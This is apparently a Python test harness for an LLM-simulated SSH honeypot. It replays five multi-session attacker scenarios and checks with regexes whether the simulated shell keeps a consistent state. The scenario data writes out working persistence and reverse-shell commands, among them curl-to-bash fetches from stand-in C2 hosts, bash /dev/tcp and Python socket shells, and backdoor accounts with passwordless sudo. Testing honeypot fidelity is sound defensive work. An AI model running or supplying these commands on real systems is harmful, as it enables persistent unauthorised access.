import asyncio
import json
import os
import sys
import time
import shutil
from datetime import datetime
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Callable

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from attack_replay_test import (
    AttackResult, call_llm, SYSTEM_PROMPT,
    check_semantic_verification,
    ai_client, AI_MODEL,
)
from mcp_client import HoneypotMCPClient
from mcp_state_manager.command_analyzer import CommandAnalyzer
from LinuxSSHbot_mcp import build_enhanced_messages


# ==================== Interactive Scenario Definitions ====================

INTERACTIVE_SCENARIOS = [
    {
        "id": "INT-01",
        "name": "Fallback Persistence (试错回退型持久化)",
        "description": (
            "Attacker tries systemd first, falls back to cron, then rc.local. "
            "Tests PromptShield's ability to track state across failed + successful attempts."
        ),
        "source": "Synthesized from real attacker behavior in Cowrie logs",
        "mitre": "T1543.002, T1053.003, T1037.004",
        "sessions": [
            {
                "id": "session_a",
                "commands": [
                    # Try systemd — but check if it exists first
                    "which systemctl",
                    # Attempt systemd (may or may not succeed on this host)
                    "systemctl --version",
                    # Write the service file anyway
                    'echo "[Unit]\nDescription=updater\n[Service]\nExecStart=/bin/bash -c \'curl http://c2.test.net/task | bash\'\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/updater.service',
                    "systemctl daemon-reload",
                    "systemctl enable updater.service",
                    # Fallback 1: try cron
                    "which crontab",
                    '(crontab -l 2>/dev/null; echo "*/20 * * * * curl -s http://c2.test.net/task | bash") | crontab -',
                    "crontab -l",
                    # Fallback 2: rc.local as backup
                    'echo "#!/bin/bash\ncurl -s http://c2.test.net/task | bash &" > /etc/rc.local',
                    "chmod +x /etc/rc.local",
                ],
            },
            {
                "id": "session_b",
                "commands": [
                    # Verify which persistence methods stuck
                    "crontab -l",
                    "cat /etc/rc.local",
                    "systemctl is-enabled updater.service 2>/dev/null || echo 'systemd: not available'",
                ],
            },
        ],
        "verify_semantic": {
            "type": "multi_persistence",
            "checks": [
                {"method": "regex", "pattern": r"c2\.test\.net"},
                {"method": "regex", "pattern": r"(cron|rc\.local|systemd|updater)"},
                {"method": "regex", "pattern": r"(curl|wget).*https?://"},
            ],
        },
    },
    {
        "id": "INT-02",
        "name": "Recon-Driven Shell Selection (侦察驱动反弹 Shell 选择)",
        "description": (
            "Attacker checks which interpreters are available before choosing "
            "a reverse shell language. Simulates conditional decision-making."
        ),
        "source": "Common pattern in Cowrie post-exploitation logs",
        "mitre": "T1059",
        "sessions": [
            {
                "id": "session_a",
                "commands": [
                    # Recon: what's available?
                    "which python3 python perl ruby nc ncat 2>/dev/null",
                    "ls /usr/bin/python* 2>/dev/null",
                    # Based on recon — use python3 (the most common)
                    'echo \'#!/usr/bin/python3\nimport socket,subprocess,os\ns=socket.socket()\ns.connect(("10.0.0.50",6666))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/bash","-i"])\' > /tmp/.rev_shell.py',
                    "chmod +x /tmp/.rev_shell.py",
                    # Also prepare a bash fallback
                    'echo "bash -i >& /dev/tcp/10.0.0.50/6666 0>&1" > /tmp/.rev_shell.sh',
                    "chmod +x /tmp/.rev_shell.sh",
                    # Schedule the python one (preferred)
                    '(crontab -l 2>/dev/null; echo "0 */4 * * * /usr/bin/python3 /tmp/.rev_shell.py") | crontab -',
                ],
            },
            {
                "id": "session_b",
                "commands": [
                    "cat /tmp/.rev_shell.py",
                    "cat /tmp/.rev_shell.sh",
                    "crontab -l",
                ],
            },
        ],
        "verify_semantic": {
            "type": "reverse_shell_multi",
            "checks": [
                {"method": "regex", "pattern": r"socket.*connect"},
                {"method": "regex", "pattern": r"(python|bash).*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"},
                {"method": "regex", "pattern": r"[*/0-9]+\s+[*/0-9]+\s+[*/0-9]+"},
            ],
        },
    },
    {
        "id": "INT-03",
        "name": "Noisy Persistence (噪声穿插型持久化)",
        "description": (
            "Attacker interleaves persistence commands with noise "
            "(recon, directory browsing, red herrings). "
            "Tests PromptShield's ability to extract signal from noise."
        ),
        "source": "Synthesized from Cowrie session analysis",
        "mitre": "T1136.001, T1098.004",
        "sessions": [
            {
                "id": "session_a",
                "commands": [
                    # Noise: browsing around
                    "ls -la /",
                    "cat /etc/hostname",
                    "uptime",
                    # Real action 1: create user
                    "useradd -m -s /bin/bash -G sudo backdoor_user",
                    "echo 'backdoor_user:p@ssw0rd123' | chpasswd",
                    # Noise: more browsing
                    "df -h",
                    "free -m",
                    "ps aux | head -20",
                    # Real action 2: SSH key
                    "mkdir -p /home/backdoor_user/.ssh",
                    'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKey... noisy@attacker" >> /home/backdoor_user/.ssh/authorized_keys',
                    # Noise: check their work
                    "ls -la /home/",
                    "cat /etc/passwd | tail -3",
                    # Real action 3: sudoers
                    'echo "backdoor_user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/backdoor_user',
                ],
            },
            {
                "id": "session_b",
                "commands": [
                    "id backdoor_user",
                    "cat /home/backdoor_user/.ssh/authorized_keys",
                    "sudo -l -U backdoor_user",
                ],
            },
        ],
        "verify_semantic": {
            "type": "noisy_persistence",
            "checks": [
                {"method": "regex", "pattern": r"uid=\d+"},
                {"method": "regex", "pattern": r"ssh-(ed25519|rsa)\s+AAAA"},
                {"method": "regex", "pattern": r"NOPASSWD"},
            ],
        },
    },
    {
        "id": "INT-04",
        "name": "Typo Recovery (命令纠错型)",
        "description": (
            "Attacker makes typos and corrects them. "
            "Tests that PromptShield doesn't persist failed/typo commands as state."
        ),
        "source": "Common pattern in interactive SSH sessions",
        "mitre": "T1053.003, T1059.004",
        "sessions": [
            {
                "id": "session_a",
                "commands": [
                    # Typo: crontba instead of crontab
                    "crontba -l",
                    # Correct it
                    "crontab -l",
                    # Typo: ecoh instead of echo
                    'ecoh "#!/bin/bash" > /tmp/.backdoor.sh',
                    # Correct it
                    'echo "#!/bin/bash" > /tmp/.backdoor.sh',
                    'echo "bash -i >& /dev/tcp/10.0.0.99/7777 0>&1" >> /tmp/.backdoor.sh',
                    "chmod +x /tmp/.backdoor.sh",
                    # Typo: chmo instead of chmod
                    "chmo +x /tmp/.backdoor.sh",
                    # That failed, try the cron entry
                    '(crontab -l 2>/dev/null; echo "*/30 * * * * /tmp/.backdoor.sh") | crontab -',
                    # Verify
                    "crontab -l",
                ],
            },
            {
                "id": "session_b",
                "commands": [
                    "cat /tmp/.backdoor.sh",
                    "crontab -l",
                ],
            },
        ],
        "verify_semantic": {
            "type": "typo_recovery",
            "checks": [
                {"method": "regex", "pattern": r"(tcp|bash|sh).*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"},
                {"method": "regex", "pattern": r"[*/0-9]+\s+[*/0-9]+\s+[*/0-9]+.*backdoor"},
            ],
        },
    },
    {
        "id": "INT-05",
        "name": "Three-Phase Session Chain (三阶段会话链)",
        "description": (
            "Session A: initial implant. Session B: reconnect, check, and MODIFY. "
            "Session C: final verification. Tests incremental state updates."
        ),
        "source": "Synthesized from APT persistent access patterns",
        "mitre": "T1136.001, T1098.004, T1053.003",
        "sessions": [
            {
                "id": "session_a",
                "commands": [
                    # Phase 1: Initial implant
                    "useradd -m -s /bin/bash ops_agent",
                    "echo 'ops_agent:InitialP@ss!' | chpasswd",
                    'echo "#!/bin/bash\ncurl -s http://c2.phase1.net/beacon" > /usr/local/bin/.health',
                    "chmod +x /usr/local/bin/.health",
                    '(crontab -l 2>/dev/null; echo "0 */12 * * * /usr/local/bin/.health") | crontab -',
                ],
            },
            {
                "id": "session_b",
                "commands": [
                    # Phase 2: Reconnect, verify, and MODIFY
                    "id ops_agent",
                    "cat /usr/local/bin/.health",
                    "crontab -l",
                    # Modify: update the C2 URL (common real-world behavior)
                    'echo "#!/bin/bash\ncurl -s http://c2.phase2-updated.net/beacon" > /usr/local/bin/.health',
                    # Add SSH key (wasn't there before)
                    "mkdir -p /home/ops_agent/.ssh",
                    'echo "ssh-rsa AAAAB3... phase2_key@c2" >> /home/ops_agent/.ssh/authorized_keys',
                    # Increase cron frequency
                    "crontab -r",
                    '(crontab -l 2>/dev/null; echo "*/30 * * * * /usr/local/bin/.health") | crontab -',
                ],
            },
            {
                "id": "session_c",
                "commands": [
                    # Phase 3: Final verification — should see UPDATED state
                    "id ops_agent",
                    "cat /usr/local/bin/.health",
                    "cat /home/ops_agent/.ssh/authorized_keys",
                    "crontab -l",
                ],
            },
        ],
        "verify_semantic": {
            "type": "three_phase",
            "checks": [
                {"method": "regex", "pattern": r"uid=\d+"},
                # Should see phase2 URL, NOT phase1
                {"method": "regex", "pattern": r"phase2"},
                {"method": "regex", "pattern": r"ssh-(rsa|ed25519)\s+AAAA"},
                {"method": "regex", "pattern": r"[*/0-9]+\s+[*/0-9]+\s+[*/0-9]+"},
            ],
        },
    },
]


# ==================== Interactive Test Runner ====================

@dataclass
class InteractiveResult:
    scenario_id: str
    name: str
    per_session_responses: Dict[str, List[Dict]] = field(default_factory=dict)
    semantic_passed: Optional[bool] = None
    semantic_checks_detail: List[Dict] = field(default_factory=list)
    total_tokens: int = 0
    total_latency_ms: float = 0
    error: Optional[str] = None


async def run_interactive_scenario(scenario: dict, storage_base: str) -> InteractiveResult:
    """Run a multi-session interactive scenario."""
    sid = scenario["id"]
    print(f"\n{'='*60}")
    print(f"  [{sid}] {scenario['name']}")
    print(f"  {scenario['description']}")
    print(f"{'='*60}")

    result = InteractiveResult(scenario_id=sid, name=scenario["name"])
    storage_path = os.path.join(storage_base, sid)
    if os.path.exists(storage_path):
        shutil.rmtree(storage_path)
    os.makedirs(os.path.join(storage_path, "states"), exist_ok=True)
    os.makedirs(os.path.join(storage_path, "graphs"), exist_ok=True)

    analyzer = CommandAnalyzer()
    ip = f"attacker_{sid}"

    try:
        sessions = scenario["sessions"]
        last_session_responses = []

        for sess_idx, session in enumerate(sessions):
            sess_id = session["id"]
            print(f"\n  [{sess_id.upper()}] Running session {sess_idx+1}/{len(sessions)}...")

            client = HoneypotMCPClient(storage_path=storage_path, global_singleton_mode=True)
            await client.connect()

            messages = [{"role": "system", "content": SYSTEM_PROMPT}]
            cwd = "/root"
            session_responses = []

            for cmd in session["commands"]:
                messages.append({"role": "user", "content": f" {cmd}\t<{datetime.now()}>\n"})
                filtered = [
                    m for m in messages
                    if not (m["role"] == "assistant" and not m.get("content", "").strip())
                ]
                enhanced = await build_enhanced_messages(
                    filtered, cmd, cwd, client=client, ip_address=ip
                )
                resp, tok, lat = await call_llm(enhanced)
                resp_content = resp if resp.strip() else "[no output]"
                messages.append({"role": "assistant", "content": resp_content})

                session_responses.append({
                    "cmd": cmd[:80], "response": resp[:200],
                    "tokens": tok, "latency_ms": lat,
                })
                result.total_tokens += tok
                result.total_latency_ms += lat

                # Record to MCP
                et = analyzer.determine_event_type(cmd)
                st = analyzer.determine_status(cmd, resp)
                sc = analyzer.analyze_state_changes(cmd, resp, cwd=cwd)
                await client.record_event(
                    ip_address=ip,
                    session_id=f"{sess_id}_{sid}",
                    command=cmd, user_context="root",
                    event_type=et.value if hasattr(et, 'value') else str(et),
                    status=st.value if hasattr(st, 'value') else str(st),
                    stdout=resp,
                    state_changes=[{
                        "target": s.target, "change_type": s.change_type,
                        "old_value": s.old_value, "new_value": s.new_value,
                        "metadata": s.metadata,
                    } for s in sc] if sc else []
                )

                print(f"    {sess_id}> {cmd[:55]}... → ({tok}tok, {lat:.0f}ms)")
                await asyncio.sleep(1)

            result.per_session_responses[sess_id] = session_responses
            last_session_responses = session_responses
            await client.close()
            print(f"  [{sess_id.upper()}] OK Disconnected")
            await asyncio.sleep(1)

        # Semantic verification on the LAST session's responses
        verify_sem = scenario.get("verify_semantic")
        if verify_sem and last_session_responses:
            all_text = " ".join([r["response"] for r in last_session_responses])
            sem_passed, sem_details = check_semantic_verification(all_text, verify_sem)
            result.semantic_passed = sem_passed
            result.semantic_checks_detail = sem_details
            status = "PASS" if sem_passed else "FAIL"
            print(f"\n  Semantic Verification: {status} "
                  f"({sum(1 for d in sem_details if d['passed'])}/{len(sem_details)} checks)")

    except Exception as e:
        result.error = str(e)
        print(f"  ERROR: {e}")
        import traceback; traceback.print_exc()

    return result


async def main():
    print(f"{'#'*60}")
    print(f"  PromptShield Interactive Attack Scenario Test")
    print(f"  Scenarios: {len(INTERACTIVE_SCENARIOS)}")
    print(f"  Model: {AI_MODEL}")
    print(f"  Time: {datetime.now().isoformat()}")
    print(f"{'#'*60}")

    storage_base = "./interactive_scenario_memory"
    if os.path.exists(storage_base):
        shutil.rmtree(storage_base)

    results = []
    for scenario in INTERACTIVE_SCENARIOS:
        r = await run_interactive_scenario(scenario, storage_base)
        results.append(r)

    # Summary
    print(f"\n{'='*60}")
    print(f"  INTERACTIVE SCENARIOS SUMMARY")
    print(f"{'='*60}")

    for r in results:
        if r.semantic_passed is None:
            status = "N/A"
        elif r.semantic_passed:
            status = "PASS"
        else:
            status = "FAIL"
        sessions = len(r.per_session_responses)
        print(f"  {r.scenario_id}: {status} ({sessions} sessions, {r.total_tokens} tokens) — {r.name}")

    passed = sum(1 for r in results if r.semantic_passed)
    total = sum(1 for r in results if r.semantic_passed is not None)
    print(f"\n  Semantic Pass: {passed}/{total} ({passed/total*100:.0f}%)" if total else "")
    print(f"  Total Tokens: {sum(r.total_tokens for r in results):,}")
    print(f"  Total Latency: {sum(r.total_latency_ms for r in results)/1000:.1f}s")

    # Save report
    report = {
        "meta": {
            "test_time": datetime.now().isoformat(),
            "model": AI_MODEL,
            "total_scenarios": len(results),
            "semantic_passed": passed,
            "semantic_total": total,
            "total_tokens": sum(r.total_tokens for r in results),
        },
        "results": [asdict(r) for r in results],
    }
    fname = f"interactive_scenarios_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"\n  Report saved: {fname}")


if __name__ == "__main__":
    asyncio.run(main())
